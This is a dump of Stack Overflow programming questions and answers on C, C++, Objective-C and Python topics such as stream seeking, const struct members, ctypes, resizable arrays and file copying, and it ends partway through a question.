<p>Here's what I am trying:</p>

<pre><code>std::streampos sp = in.tellg();

while(in)
{
    char c = in.peek();

    if(isspace(c))
        break;

    ++str.mSize;
    in.get();
}

in.seekg(sp);
</code></pre>

<p>The value of sp is -1 indicating failure. Why?</p>
","9530","","<p>Not all input streams are seekable—if <code>stdin</code> is coming from a terminal or a pipe, it's not possible to seek it, forwards or backwards.  In that case, you have to buffer the data yourself.</p>
"
"<p>I would like to wrap a C library within a C++ class. For my C++ class I also would like to have the same declaration used by these C function: is it possible to do that?</p>

<p>If for example I have the case below how would it be possible to distinguish the C-function from the C++ one? I would like to call the C one off course.</p>

<pre><code> extern int my_foo( int val ); //

 class MyClass{
    public:
    int my_foo( int val ){
           // what to write here to use
           // the C functions?
           // If I call my_foo(val) it will call
           // the class function not the global one
    }
 }
</code></pre>
","9530","","<p>Use the <a href=""http://en.wikipedia.org/wiki/Scope_resolution_operator"">scope resolution operator <code>::</code></a>:</p>

<pre><code>int my_foo( int val ){
    // Call the global function 'my_foo'
    return ::my_foo(val);
}
</code></pre>
"
"<p>I have this code</p>

<pre><code>typedef struct
{
    const char* fooString;
    const bool  fooBool;
}fooStruct;
</code></pre>

<p>And this initializer:</p>

<pre><code>static const fooStruct foo[] =
{
    {""file1"", true},
    {""file2"", false},
    ....
};
</code></pre>

<p>With this code I have 3 warnings in VS2008:</p>

<pre><code>error C2220: warning treated as error - no 'object' file generated  
warning C4510: '&lt;unnamed-tag&gt;' : default constructor could not be generated
warning C4512: '&lt;unnamed-tag&gt;' : assignment operator could not be generated
warning C4610: struct '&lt;unnamed-tag&gt;' can never be instantiated - user defined constructor required 
</code></pre>
","9530","","<p>It's exactly what the compiler says: it can't generate a default constructor or assignment operator for your struct because it has a <code>const</code> member in it (<code>const bool fooBool</code>).  struct members which are <code>const</code> or which are references cannot be default-initialized, so they must be explicitly initialized in a user-written constructor or assignment operator.</p>

<p>One solution is to write your own default constructor and assignment operator (and in line with the <a href=""http://en.wikipedia.org/wiki/Rule_of_three_%28C%2B%2B_programming%29"">rule of three</a>, you should also write a copy constructor; a destructor isn't strictly necessary but is good practice).  The alternative, easier solution is just to make <code>fooBool</code> non-<code>const</code>.  Then, the compiler will happily generate the default constructor and assignment operator for you.</p>

<p>Since you're already creating an array of <code>const</code> instances of these with <code>static const fooStruct foo[] = ...</code>, the extra <code>const</code> on <code>fooBool</code> is pointless.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/7048888/stdvectorstdstring-to-char-array"">std::vector&lt;std::string&gt; to char* array</a>  </p>
</blockquote>



<p>I have to call a c function that accepts an array of string pointers. Example</p>

<pre><code>void cFunction(char* cities[], int count)
 {
   for(int i = 0; i &lt; count; ++i )
   {
    printf(""%s\n"", cities[i]);
   }
 }
</code></pre>

<p>Assume that function is in some third party libabry; it cannot be changed<br>
I can declare a static array and call the function like this<br></p>

<pre><code>char* placesA[] = {""Teakettle Junction"", ""Assawoman Bay"", ""Land O' Lakes"", ""Ion"", ""Rabbit Hask"" };
cFunction(placesA, 5);
</code></pre>

<p><br>
That works. But my data is dynamic i.e. the size of the array changes many times at runtime<br>
So I tried this<br></p>

<pre><code>std::vector&lt;std::string&gt; placesB(placesA, placesA + 5);
cFunction(&amp;placesB[0], 5); // this won't work because std::string != char*[]
</code></pre>

<p><br>
Tried this <br></p>

<pre><code>std::vector&lt;char*&gt; placesC; 
cFunction(&amp;placesC[0], 5);
</code></pre>

<p>I find <code>placesC</code> awkward to populate at the sametime avoid memory leaks<br> I am looking for a solution that is both efficient ( as little string copying as possible and preferably uses STL and or Boost )</p>
","9530","","<p>There's going to be some awkwardness no matter how you slice it.  If the C API truly requires modifiable arrays, then that's what you'll need to provide -- you'll have to copy your strings into.  If it doesn't modify the strings, then you can use a <code>std::vector</code> of <code>const char*</code>, where the string data is still owned by the underlying <code>std::string</code> objects; you just have to be careful that the C API doesn't hold onto references to those strings and tries to access them after the strings have been modified or deallocated.</p>

<p>For example, here's one way to do it:</p>

<pre><code>// Unary functor which calls c_str() on a std::string object
struct StdStringCStrFunctor
{
    const char *operator() (const std::string&amp; str) { return str.c_str(); }
};
...

std::vector&lt;std::string&gt; places;
... // populate places

// Convert to array of C strings
std::vector&lt;const char *&gt; placesCStr(places.size());
std::transform(places.begin(), places.end(), placesCStr.begin(), StdStringCStrFunctor());
cFunction(const_cast&lt;char**&gt;(&amp;placesCStr[0]), placesCStr.size());
</code></pre>
"
"<p>I have been testing different features of Objective -C and reached topic which deals with memory management. Apparently upon reading few documents it seems memory management is a very strict in order to build well functioned application. </p>

<p>Now as per my understanding, When we allocate a memory an object's <code>retainCount</code> will become <strong>1</strong>. However Something I wrote for learning purposes and it is giving me abnormal <code>retainCount</code></p>

<p>It might be abnormal number for me, But people who's knows under the hood, Could you please explain how did I get this <code>retainCount</code> and what will be the best way to release it.</p>

<p>Code which has abnormal retainCount, </p>

<p>Object name is : <code>...(UISlider *) greenSender...</code></p>

<pre><code>-(IBAction) changeGreen:(UISlider *)greenSender{
    showHere.textColor = [UIColor colorWithRed:red.value green:greenSender.value blue:blue.value alpha:1.0];
    NSLog(@""retainCount %d"",[greenSender retainCount]);
}
</code></pre>

<p>Has <code>reatainCount</code>, just after executing my code.</p>

<p><img src=""http://i.stack.imgur.com/JN4Ki.png"" alt=""enter image description here""></p>

<p>A short explanation will give me a hint, And external reading resources would be appreciated.
Thanks</p>
","9530","","<p><strong>Do not rely on retain counts</strong>.  They should only be used as a debugging tool.  The reason is that if an object gets <code>retain</code>ed and <code>autorelease</code>d, its <em>effective</em> retain count has not changed, but its <em>actual</em> retain count has increased by one.  It will be <code>release</code>d at some point in the future when the autorelease pool drains.  Therefore, you cannot rely on the retain count for knowing whether the object has been managed properly or not.</p>

<p>A large retain count such as 8 may indicate a programming bug (such as retaining it too many times), but it could also just be a sign that it has been <code>retain</code>ed and <code>autorelease</code>d a large number of times, which, although curious, could be perfectly valid.</p>
"
"<p>I have a subprocess command that outputs some characters such as '\xf1'. I'm trying to decode it as utf8 but I get an error.</p>

<pre><code>s = '\xf1'
s.decode('utf-8')
</code></pre>

<p>The above throws:</p>

<pre><code>UnicodeDecodeError: 'utf8' codec can't decode byte 0xf1 in position 0: unexpected end of data
</code></pre>

<p>It works when I use 'latin-1' but shouldn't utf8 work as well? My understanding is that latin1 is a subset of utf8.</p>

<p>Am I missing something here?</p>

<p>EDIT:</p>

<pre><code>print s # ñ
repr(s) # returns ""'\\xa9'""
</code></pre>
","9530","","<blockquote>
  <p>My understanding is that latin1 is a subset of utf8.</p>
</blockquote>

<p>Wrong.  Latin-1, aka <a href=""http://en.wikipedia.org/wiki/ISO_8859-1"" rel=""nofollow"">ISO 8859-1</a> (and sometimes erroneously as <a href=""http://en.wikipedia.org/wiki/Windows-1252"" rel=""nofollow"">Windows-1252</a>), is not a subet of UTF-8.  ASCII, on the other hand, <em>is</em> a subset of UTF-8.  ASCII strings are valid UTF-8 strings, but generalized Windows-1252 or ISO 8859-1 strings are not valid UTF-8, which is why <code>s.decode('UTF-8')</code> is throwing a <code>UnicodeDecodeError</code>.</p>
"
"<p>I use a class A from a library and want to add some functionality to it via an own class B.
The user of class B should derive from it as if he would derive from class A.</p>

<pre><code>class A {
    public:
        virtual void func1()=0;
        virtual void func2()=0;
        ...
}
class B: public A {
    public:
        virtual void func1() {...}
}
</code></pre>

<p>So if someone creates a class C deriving from B, he should have to implement func2:</p>

<pre><code>class C: public B {
    public:
        virtual void func2() {...}
}
</code></pre>

<p>It is very important for my application, that class C doesn't overwrite func1, eliminating B::func1().</p>

<p>Is there a way to forbid overwriting this virtual function for all child classes of B? If not in plain C++, is there something in boost MPL that throws a compiler error, when this function is overwritten?</p>
","9530","","<p>No, that's not possible in the current edition of C++, aka C++03.  The upcoming C++11 standard will include the contextual keyword <code>final</code> which will make this possible:</p>

<pre><code>// C++11 only: indicates that the function cannot be overridden in a subclass
virtual void MemberFunction() final { ... }
</code></pre>

<p>The Microsoft Visual C++ compiler also includes the keyword <a href=""http://msdn.microsoft.com/en-us/library/0w2w91tf%28v=vs.80%29.aspx"" rel=""nofollow""><code>sealed</code></a>, as an extension, which functions similarly to the C++11 keyword <code>final</code>, but this only works with Microsoft's compiler.</p>
"
"<p>I need to deal with super large txt input files, and I usually use .readlines() to first read the whole file, and turn it into a list.</p>

<p>I know it's really memory-cost and can be quite slow, but I also need to make use of LIST characteristics to manipulate the specific lines, like below:</p>

<pre><code>#!/usr/bin/python

import os,sys
import glob
import commands
import gzip

path= '/home/xxx/scratch/'
fastqfiles1=glob.glob(path+'*_1.recal.fastq.gz')

for fastqfile1 in fastqfiles1:
    filename = os.path.basename(fastqfile1)
    job_id = filename.split('_')[0]
    fastqfile2 = os.path.join(path+job_id+'_2.recal.fastq.gz') 

    newfastq1 = os.path.join(path+job_id+'_1.fastq.gz') 
    newfastq2 = os.path.join(path+job_id+'_2.fastq.gz') 

    l1= gzip.open(fastqfile1,'r').readlines()
    l2= gzip.open(fastqfile2,'r').readlines()
    f1=[]
    f2=[]
    for i in range(0,len(l1)):
        if i % 4 == 3:
           b1=[ord(x) for x in l1[i]]
           ave1=sum(b1)/float(len(l1[i]))
           b2=[ord(x) for x in str(l2[i])]
           ave2=sum(b2)/float(len(l2[i]))
           if (ave1 &gt;= 20 and ave2&gt;= 20):
              f1.append(l1[i-3])
              f1.append(l1[i-2])
              f1.append(l1[i-1])
              f1.append(l1[i])
              f2.append(l2[i-3])
              f2.append(l2[i-2])
              f2.append(l2[i-1])
              f2.append(l2[i])
    output1=gzip.open(newfastq1,'w')
    output1.writelines(f1)
    output1.close()
    output2=gzip.open(newfastq2,'w')
    output2.writelines(f2)
    output2.close()
</code></pre>

<p>In general, I'm trying to read every 4th line of the whole text, but if the 4th line meets the desired condition, I'll append these 4 lines into the text.
So can I avoid readlines() to achieve this?
thx</p>

<p>EDIT:
Hi, actually I myself found a better way:</p>

<pre><code>import commands
 l1=commands.getoutput('zcat ' + fastqfile1).splitlines(True)
 l2=commands.getoutput('zcat ' + fastqfile2).splitlines(True)
</code></pre>

<p>I think 'zcat' is super fast....
It took around 15min to readlines, while only 1 minute to just zcat...</p>
","9530","","<p>If you can refactor your code to read through the file linearly, then you can just say <code>for line in file</code> to iterate through each line of the file without reading it all into memory at once.  But, since your file access looks more complicated, you could use a <em>generator</em> to replace <code>readlines()</code>.  One way to do this would be to use <a href=""http://docs.python.org/library/itertools.html#itertools.izip"" rel=""nofollow""><code>itertools.izip</code></a> or <code>itertools.izip_longest</code>:</p>

<pre><code>def four_at_a_time(iterable):
    """"""Returns an iterator that returns a 4-tuple of objects at a time from the
       given iterable""""""
    args = [iter(iterable) * 4]
    return itertools.izip(*args)
...
l1 = four_at_a_time(gzip.open(fastqfile1, 'r'))
l2 = four_at_a_time(gzip.open(fastqfile2, 'r'))
for i, x in enumerate(itertools.izip(l1, l2))
    # x is now a 2-tuple of 4-tuples of lines (one 4-tuple of lines from the first file,
    # and one 4-tuple of lines from the second file).  Process accordingly.
</code></pre>
"
"<p>I'd like to write a logic test to test for the case when [super init] fails.</p>

<p>I have an init method like this:</p>

<pre><code>- (id)init
{
    if ((self = [super init]) != nil)
    {
        // init my members
    }
    return self;
}
</code></pre>

<p>Does anyone know how I can get [super init] to return nil to test this case?  ""super"" is NSObject in this case and I'm currently using SenTestKit for logic tests.</p>
","9530","","<p>You could interject an intermediate parent class that failed its <code>init</code> method:</p>

<pre><code>@interface InitFailTest : NSObject
{
}

- (id)init;
@end

@implementation InitFailTest
- (id)init
{
    if (gFailSuperInitTest)
        return nil;
    else
        return [super init];
}
@end

@interface MyClass : InitFailTest  // instead of NSObject
...
</code></pre>

<p>But that's seems a bit heavyweight.  If your parent class is <code>NSObject</code>, then honestly I wouldn't worry too much about testing if its <code>init</code> method fails.  If your parent class is something else and it has documented failure conditions, then of course you should test those.</p>
"
"<p>I've just read this <a href=""https://developers.facebook.com/docs/reference/dialogs/feed/"" rel=""nofollow"">https://developers.facebook.com/docs/reference/dialogs/feed/</a></p>

<p>It says since the 12th of July 2011 it is not possible anymore to use the ""message"" property to prefill a message to post on users wall e.g.</p>

<pre><code>NSMutableDictionary *params = [NSMutableDictionary dictionaryWithObjectsAndKeys: @""hi!"", @""message"", nil]; 
[facebook dialog:@""feed"" andParams:params andDelegate:self]
</code></pre>

<p>Can anybody please explain what is the official plan B?</p>
","9530","","<p>As the documentation says:</p>

<blockquote>
  <p>If you would like your application to publish directly to a profile's feed without user interaction, use the corresponding <a href=""https://developers.facebook.com/docs/reference/api/post/#publishing"" rel=""nofollow"">Graph API call</a>.</p>
</blockquote>

<p>However, note that you need to ask for the <code>publish_stream</code> <a href=""https://developers.facebook.com/docs/reference/api/permissions/"" rel=""nofollow"">extended permission</a> in order to be able to post to a user's wall.</p>
"
"<p>Well, the title is quite explicit, but a little explantations for those interested in the background.
I'm developing a little image browser. On part of the application is a directory browser which allows me to browse all the folders of my hard drive and mounted volumes.
And while profiling, I noticed that the most time consuming method of my application was the following piece of code :</p>

<pre><code>// get the content of the directory
NSFileManager * fileManager = [NSFileManager defaultManager];
NSURL * url = [NSURL fileURLWithPath:mPath];
mCachedContent = [[fileManager contentsOfDirectoryAtURL:url
                               includingPropertiesForKeys:nil
                               options:NSDirectoryEnumerationSkipsHiddenFiles
                               error:nil] retain];

// parse the content, count the number of images and directories.
for (NSURL * item in mCachedContent)
{
    if (CFURLHasDirectoryPath((CFURLRef)item))
    {
        ++mNumChildren;
    }
    else if ([FileUtils isImage:[item path]] == YES)
    {
        ++mNumImages;
    }
}
</code></pre>

<p>This is necessary so that the NSOutlineView can know if a directory is expandable (and the number of images is also a feature I need)
To be more precise, the most time consuming method if [NSFileManager contentsOfDirectoryAtURL...]</p>

<p>So, is there any other way of getting a directory's content more efficient than the one I'm using ?</p>

<p>Thanks in advance for any help !</p>
","9530","","<p>No matter how you write this function (e.g. with either Cocoa's <code>NSFileManager</code> API or the Unix <a href=""http://developer.apple.com/library/ios/#documentation/System/Conceptual/ManPages_iPhoneOS/man3/opendir.3.html"" rel=""nofollow""><code>opendir(3)</code>/<code>readdir(3)</code></a> API), it's going to be I/O-bound—you're going to spend more time waiting on I/O than on any CPU operations performed in the middle layers.</p>

<p>If this is truly your bottleneck, then that means you're doing way too much I/O.  Make sure you're not doing anything stupid like continually reading the contents of the same directory over and over again hundreds of times per second.  If you need to continually watch a particular directory and take action whenever something in that directory changes (e.g. a file gets written to, a file is created or deleted, etc.), then use the <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Conceptual/FSEvents_ProgGuide/Introduction/Introduction.html"" rel=""nofollow"">File Systems Events API</a>.  This allows you to efficiently respond to those events when they happen without having to continually poll the directory.</p>
"
"<p>I come from a C# background and I am learning Objective-C. I was wondering if I could get some clarification on syntax. Thanks in advance for your help.</p>

<p>What is the difference between the lines of code shown below? Given that I know for sure that the type in the ""tempItem"" dictionary is an (NSString *) type and <code>newsItem.pictureUrl</code> is also an (NSString *):</p>

<p>Scenario 1:</p>

<pre><code>newsItem.pictureUrl = [tempItem objectForKey:@""picture""];
</code></pre>

<p>Scenario 2:</p>

<pre><code>newsItem.pictureUrl = (NSString *)[tempItem objectForKey:@""picture""];
</code></pre>
","9530","","<p>There's no difference between the two lines of code; it's purely stylistic.</p>

<p>The method <code>objectForKey:</code> here returns an object of type <code>id</code>, which is a generic object pointer.  In Objective-C, an <code>id</code> can be implicitly converted to any Objective-C object type without a cast.  The following two lines are equivalent:</p>

<pre><code>id someId = ...;
NSString *someString = someId;  // #1
NSString *someString = (NSString *)someId;  // #2
</code></pre>

<p>This is similar to how in C, a pointer of type <code>void*</code> can be implicitly converted to a pointer to any other type without a cast (that is also true of Objective-C, but <code>void*</code> pointers are discouraged in Objective-C; that is <em>not</em> true in C++).</p>

<p>As far as type safety goes, both are equivalently unsafe.  If the runtime type of the object is in fact the type you're casting it to (whether the cast is explicit or implicit) or a subclass thereof, then everything will work as intended.  If the runtime type is <em>not</em> what you're expecting, then most likely an <code>NSException</code> will be thrown with the common <code>object does not response to selector</code> error, due to calling a function that doesn't exist for that type.  It's also possible you might crash with a segmentation fault due to accessing an ivar that doesn't exist or has an unexpected value (since the object really isn't that type).</p>

<p>If you're unsure of that object's runtime type, you should check its runtime type with the <code>-class</code> or <code>-isKindOfClass: methods, and then only take action if it's a particular type.  Prefer using</code>-isKindOfClass:`, since that still works with subclasses, as opposed to comparing the class for exact equality with a particular class.  For example:</p>

<pre><code>id someId = ...;
if ([someId isKindOfClass:[NSString class])
{
    // It's an NSString
    NSString *someString = someId;
    // Do stuff with someString...
}
</code></pre>
"
"<p>test.c:</p>

<pre><code>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#define MAXFRAGMENTS 4000000

typedef struct {
    uint64_t FirstFragmentTimestamp;
} fragment_t;

typedef struct {
    fragment_t** fragments;
} bts_t;


bts_t* initialize() {
    uint32_t i;
    bts_t* bts;
    bts = (bts_t *) malloc(sizeof(bts_t));
    bts-&gt;fragments= (fragment_t **) malloc(sizeof(bts_t *)*MAXFRAGMENTS);
    for(i=0;i&lt;MAXFRAGMENTS;i++) {
        (bts-&gt;fragments)[i]=(fragment_t *) malloc(sizeof(fragment_t));
        (bts-&gt;fragments)[i]-&gt;FirstFragmentTimestamp = 0;
    }
    return bts;
}

int fr(bts_t *bts)
{
    uint32_t i;
    if ( bts != NULL ) {
        for(i=0;i&lt;MAXFRAGMENTS;i++) {
            free(bts -&gt; fragments[i]);
        }
        free(bts-&gt;fragments);
    }
    free(bts);
  return 1;
}


int main() {
}
</code></pre>

<p>test.py:</p>

<pre><code>from ctypes import *
import time

class fragment(Structure):
    _fields_=[(""FirstFragmentTimestamp"",c_ulong)]

class bts(Structure):
    _fields_=[(""fragments"",POINTER(POINTER(fragment)))]


bts_pointer=POINTER(bts)
bts_library=CDLL(""test.so"")
bts_initialize = bts_library.initialize
bts_initialize.restype = bts_pointer
bts_free = bts_library.fr
m = bts_pointer()
m = bts_initialize()
bts_free(m)
print 'done'
time.sleep(20)
</code></pre>

<p>Why top show, what memory not free after run bts_free and before end of script ?</p>
","9530","","<p>This may not be your only problem, but the ctypes type <code>c_ulong</code> corresponds to the C type <code>unsigned long</code>, which is only 32 bits.  You should use <code>c_ulonglong</code> instead, which is 64 bits.</p>
"
"<p>Are there any other uses for Python's ""from"" keyword aside from <code>import</code> statements?</p>
","9530","","<p>The following use</p>

<pre><code>from __future__ import some_feature
</code></pre>

<p>is syntactically identical to an import statement but instead of importing a module, it changes the behavior of the interpreter in some fashion, depending on the value of <code>some_feature</code>.</p>

<p>For example, <code>from __future__ import with_statement</code> allows you to use Python's <code>with</code> statement in Python 2.5, even though the <code>with</code> statement wasn't added to the language until Python 2.6.  Because it changes the parsing of source files, any <code>__future__</code> imports must appear at the beginning of a source file.</p>

<p>See the <a href=""httP://docs.python.org/reference/simple_stmts.html#future-statements"" rel=""nofollow""><code>__future__</code> statement documentation</a> for more information.</p>

<p>See the <a href=""http://docs.python.org/library/__future__.html"" rel=""nofollow""><code>__future__</code> module documentation</a> for a list of possible <code>__future__</code> imports and the Python versions they are available in.</p>
"
"<p>I have a c array:</p>

<pre><code>CGPoint hillKeyPoints[kMaxHillKeyPoints];
</code></pre>

<p>How do I access this from another class?</p>

<p>If I had an <code>NSArray</code> I would use a pointer to access the array, ie:  </p>

<pre><code>hillClass.[hillKeypoints objectAtIndex:0];
</code></pre>

<p>How does this work in c?</p>

<p>Thanks</p>
","9530","","<p>C doesn't have classes.  C just has structures and ordinary functions.  Access is straightforward using one of the structure member access operators <code>.</code> or <code>-&gt;</code> (depending on whether or not you have a pointer) and the array subscripting operator <code>[]</code>:</p>

<pre><code>typedef struct HillStruct
{
    CGPoint hillKeyPoints[kMaxHillKeyPoints];
} HillStruct;

void SomeFunction(HillStruct *hillStruct)
{
    // Read first member of the array in the structure
    CGPoint firstPoint = hillStruct-&gt;hillKeyPoints[0];
    // etc.
}
</code></pre>
"
"<p>A lot of times I've seen text-based programs which replace text which has already been printed. For instance, imagine a program where the progress is printed as</p>

<pre><code>Loading: 5%
</code></pre>

<p>and then it says</p>

<pre><code>Loading: 10%
</code></pre>

<p>and so on, <em>without</em> printing new text which is <em>appended</em>?</p>

<p>How is this done? I haven't seen any such functions available in the library (in this case C). I have an idea, though: There is a character you can write which returns the prompt to the beginning of current line (<code>\r</code> I believe). Could this be used to ""overwrite"" what you've already printed to the command prompt?</p>
","9530","","<p>In most consoles, writing a bare carriage return <code>\r</code> without a newline after it will return the cursor to the beginning of the current line, allowing you to overwrite the existing text.  Writing the backspace character <code>\b</code> also moves the cursor back one character.</p>

<p>For simple behavior, such as a progress indicator, this is all you need.  For more complex behavior, you need to control the terminal through non-standard means.  On Unix-based systems, the <a href=""http://www.gnu.org/s/ncurses/"">ncurses</a> library can be used—it gives you full control over the cursor location, text color, keyboard echoing, more fine-grained keyboard input, and more.</p>

<p>On Windows, there's a <a href=""http://msdn.microsoft.com/en-us/library/ms682010%28v=VS.85%29.aspx"">suite of functions</a> for manipulating consoles, and they can do mostly the same things as Unix consoles.</p>
"
"<p>I'm used to PHP, but I'm starting to learn C. I'm trying to create a program that reads a file line by line and stores each line to an array.</p>

<p>So far I have a program that reads the file line by line, and even prints each line as it goes, but now I just need to add each line to an array.</p>

<p>My buddy last night was telling me a bit about it. He said I'd have to use a multidimensional array in C, so basically <code>array[x][y]</code>. The <code>[y]</code> part itself is easy, because I know the maximum amount of bytes that each line will be. However, I don't know how many <em>lines</em> the file will be.</p>

<p>I figure I can make it loop through the file and just increment an integer each time and use that, but I feel that there might be a more simple way of doing it.</p>

<p>Any ideas or even a hint in the right direction? I appreciate any help.</p>
","9530","","<p>There's no standard resizable array type in C.  You have to implement it yourself, or use a third-party library.  Here's a simple bare-bones example:</p>

<pre><code>typedef struct int_array
{
    int *array;
    size_t length;
    size_t capacity;
} int_array;

void int_array_init(int_array *array)
{
    array-&gt;array = NULL;
    array-&gt;length = 0;
    array-&gt;capacity = 0;
}

void int_array_free(int_array *array)
{
    free(array-&gt;array);
    array-&gt;array = NULL;
    array-&gt;length = 0;
    array-&gt;capacity = 0;
}

void int_array_push_back(int_array *array, int value)
{
    if(array-&gt;length == array-&gt;capacity)
    {
        // Not enough space, reallocate.  Also, watch out for overflow.
        int new_capacity = array-&gt;capacity * 2;
        if(new_capacity &gt; array-&gt;capacity &amp;&amp; new_capacity &lt; SIZE_T_MAX / sizeof(int))
        {
            int *new_array = realloc(array-&gt;array, new_capacity * sizeof(int));
            if(new_array != NULL)
            {
               array-&gt;array = new_array;
               array-&gt;capacity = new_capacity;
            }
            else
                ; // Handle out-of-memory
        }
        else
            ; // Handle overflow error
    }

    // Now that we have space, add the value to the array
    array-&gt;array[array-&gt;length] = value;
    array-&gt;length++;
}
</code></pre>

<p>Use it like this:</p>

<pre><code>int_array a;
int_array_init(&amp;a);

int i;
for(i = 0; i &lt; 10; i++)
    int_array_push_back(&amp;a, i);
for(i = 0; i &lt; a.length; i++)
    printf(""a[%d] = %d\n"", i, a.array[i]);

int_array_free(&amp;a);
</code></pre>

<p>Of course, this is only for an array of <code>int</code>s.  Since C doesn't have templates, you'd have to either put all of this code in a macro for each different type of array (or use a different preprocessor such as <a href=""http://www.gnu.org/s/m4/"" rel=""nofollow"">GNU m4</a>).  Or, you could use a generic array container that either used <code>void*</code> pointers (requiring all array elements to be <code>malloc</code>'ed) or opaque memory blobs, which would require a cast with every element access and a <code>memcpy</code> for every element get/set.</p>

<p>In any case, it's not pretty.  Two-dimensional arrays are even uglier.</p>
"
"<p>I'm working on an app that takes an article (simple HTML page), and a list of vocabulary terms (each may be a word, a phrase, or even a sentence), and creates a link for each term it finds.  The problem is that for larger texts with more terms it takes a long time.  Currently we are dealing with this by initially displaying the unmarked text, processing the links in the background, and finally reloading the web view when processing finishes.  Still, it can take a while and some of our users are not happy with it.</p>

<p>Right now the app uses a simple loop on the terms, doing a replacement in the HTML. Basically:</p>

<pre><code>for (int i=0; i&lt;terms.count; i++){
    NSString *term = [terms objectAtIndex:i];
    NSString *replaceString = [NSString stringWithFormat:@""&lt;a href=""myUrl:\\%d&gt;%@&lt;/a&gt;"", i, term];
    htmlString = [htmlString stringByReplacingOccurrencesOfString:term 
                                                       withString:replaceString 
                                                          options:NSCaseInsensitiveSearch 
                                                            range:NSMakeRange(0, [htmlString length] )];
}
</code></pre>

<p>However, we are dealing with multiple languages, so there is not just one replacement per term, but twenty! That's because we have to deal with punctuation at the beginning (upside-down question marks in Spanish) and end of each term.  We have to replace <code>""term""</code>, <code>""term.""</code>, and <code>""term?""</code> with an appropriate hyperlink.</p>

<p>Is there a more efficient method I could use to get this HTML marked up?</p>

<p>I need to keep the index of the original term so that it can be retrieved later when the user clicks the link.</p>
","9530","","<p>What you're doing right now is this:</p>

<pre><code>for each vocabulary word 'term'
    search the HTML text for instances of term
        replace each instance of term with an appropriate hyperlink
</code></pre>

<p>If you have a large text, then each search takes that much longer.  Further, every time you do a replacement, you have to create a new string containing a copy of the text to do the replacement on, since <code>stringByReplacingOccurrencesOfString:withString:options:range:</code> returns a new string rather than modifying the existing string.  Multiply that by N replacements.</p>

<p>A better option would be to make a single pass through the string, searching for all terms at once, and building up the resulting output string in a mutable string to avoid a <a href=""http://en.wikipedia.org/wiki/Schlemiel_the_Painter%27s_algorithm"" rel=""nofollow"">Shlemiel the Painter-like runtime</a>.</p>

<p>For example, you could use <a href=""http://developer.apple.com/library/mac/#documentation/Foundation/Reference/NSRegularExpression_Class/Reference/Reference.html"" rel=""nofollow"">regular expressions</a> like so:</p>

<pre><code>// Create a regular expression that is an alternation of all of the vocabulary
// words.  You only need to create this once at startup.
NSMutableString *pattern = [[[NSMutableString alloc] init] autorelease];
[pattern appendString:@""\\b(""];

BOOL isFirstTerm = YES;
for (NSString *term in vocabularyList)
{
    if (!isFirstTerm)
    {
        [pattern appendString:@""|""];
        isFirstTerm = NO;
    }
    [pattern appendString:term];
}
[pattern appendString:@"")\\b""];

// Create regular expression object
NSError *error = NULL;
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:pattern options:NSRegularExpressionCaseInsensitive error:&amp;error];

// Replace vocabulary matches with a hyperlink
NSMutableString *htmlCopy = [[htmlString mutableCopy] autorelease];
[regex replaceMatchesInString:htmlCopy
                      options:0
                        range:NSMakeRange(0, [htmlString length])
                 withTemplate:@""&lt;a href=\""vocab.html?word=\\1\""&gt;\\1&lt;/a&gt;""];
// Now use htmlCopy
</code></pre>
"
"<p>I've got quite a big project and eventually I finished it. I'm just curious to know how many lines of code there are altogether in my project. I'm using Xcode 3. 
So can you actually find out how many lines of code have been compiled?</p>
","9530","","<p>Open up Terminal.app, <code>cd</code> into your project's root directory, and run this command:</p>

<pre><code>find . \( -iname \*.m -o -iname \*.mm -o -iname \*.c -o -iname \*.cc -o -iname \*.h \) -exec wc -l '{}' \+
</code></pre>

<p>If you other file types you also want to include in your count, then add more <code>-o \*.ext</code> clauses.</p>
"
"<p>I need a cross-platform, no external library, way of copying a file.  In my first pass I came up with (error handling omitted):</p>

<pre><code>char buffer[LEN];
ifstream src(srcFile, ios::in | ios::binary);
ofstream dest(destFile, ios::out | ios::binary);

while (!src.eof()) {
  src.read(buffer, LEN);
  dest.write(buffer, src.gcount());
}
</code></pre>

<p>This worked nicely <strike>and I knew exactly what it was doing.</strike></p>

<p>Then I found a post on stackoverflow (sorry, can't find a link right now) that says I can replace all of the above code with:</p>

<pre><code>dest &lt;&lt; src.rdbuf();
</code></pre>

<p>Which is nice and compact, but hides a lot about what it's doing.  It also turns out to be really slow <strike>because the implementation of ofstream::operator&lt;&lt;(streambuf) moves things 1 character at a time (using snetxc()/sputc()).</strike></p>

<p>Is there a way for me to make this method faster?  Is there a drawback to my original method?</p>

<p>Update: There's something inefficient about using operator&lt;&lt;(streambuf) on windows.  The .read()/.write() loop looks to always perform better than operator&lt;&lt;.</p>

<p>Also, changing the size of the buffer in the code above does not affect the size of the reads and writes to the hard drive.  To do that you need to set the buffers using stream.rdbuf()->pubsetbuf().</p>
","9530","","<p>Try using the C stdio API instead, it can often be faster in many implementations (see <a href=""http://social.msdn.microsoft.com/Forums/en-US/Vsexpressvc/thread/87e128e2-5320-4796-b4a2-36248f86a8ce/"" rel=""nofollow"">this thread</a> for some numbers), though not always.  For example:</p>

<pre><code>// Error checking omitted for expository purposes
char buffer[LEN];
FILE *src = fopen(srcFile, ""rb"");
FILE *dest = fopen(destFile, ""wb"");

int n;
while ((n = fread(buffer, 1, LEN, src)) &gt; 0)
{
    fwrite(buffer, 1, n, dest);
}

fclose(src);
fclose(dest);
</code></pre>
"
"<p>So I have a question for you. :)
Can you tell me the output the following code should produce?</p>

<pre><code>#include &lt;iostream&gt;
struct Optimized
{
    Optimized() { std::cout &lt;&lt; ""ctor"" &lt;&lt; std::endl; }
    ~Optimized() { std::cout &lt;&lt; ""dtor"" &lt;&lt; std::endl; }
    Optimized(const Optimized&amp; copy) { std::cout &lt;&lt; ""copy ctor"" &lt;&lt; std::endl; }
    Optimized(Optimized&amp;&amp; move) { std::cout &lt;&lt; ""move ctor"" &lt;&lt; std::endl; }
    const Optimized&amp; operator=(const Optimized&amp; rhs) { std::cout &lt;&lt; ""assignment operator"" &lt;&lt; std::endl; return *this; }
    Optimized&amp; operator=(Optimized&amp;&amp; lhs) { std::cout &lt;&lt; ""move assignment operator"" &lt;&lt; std::endl; return *this; }
};

Optimized TestFunction()
{
    Optimized a;
    Optimized b = a;
    return b;
}

int main(int argc, char* argv[])
{
    Optimized test = TestFunction();
    return 0;
}
</code></pre>

<p>My first response would be:</p>

<ol>
